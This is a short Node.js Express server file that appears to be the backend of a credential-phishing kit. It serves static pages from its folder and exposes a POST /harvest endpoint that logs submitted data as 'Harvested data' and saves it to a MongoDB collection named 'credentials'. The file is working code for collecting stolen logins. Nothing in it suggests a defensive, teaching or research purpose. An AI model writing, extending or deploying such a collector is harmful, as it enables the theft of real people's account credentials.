require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const { MongoClient } = require('mongodb');

const app = express();
const port = 3003;

const mongoUrl = process.env.MONGODB_URI;
if (!mongoUrl) {
  console.error('MongoDB URI is not defined. Please check your .env file.');
  process.exit(1);
}
const client = new MongoClient(mongoUrl);

async function connectDb() {
  try {
    await client.connect();
    console.log('Connected to MongoDB');
  } catch (err) {
    console.error('Failed to connect to MongoDB', err);
    process.exit(1);
  }
}

app.use(bodyParser.json());
app.use(express.static('.'));

app.post('/harvest', async (req, res) => {
  const data = req.body;
  console.log('Harvested data:', data);

  try {
    const db = client.db();
    const collection = db.collection('credentials');
    await collection.insertOne(data);
    res.status(200).send('Data saved');
  } catch (err) {
    console.error('Error saving data to MongoDB:', err);
    res.status(500).send('Error saving data');
  }
});

app.listen(port, () => {
  console.log(`Server listening at http://localhost:${port}`);
  connectDb();
});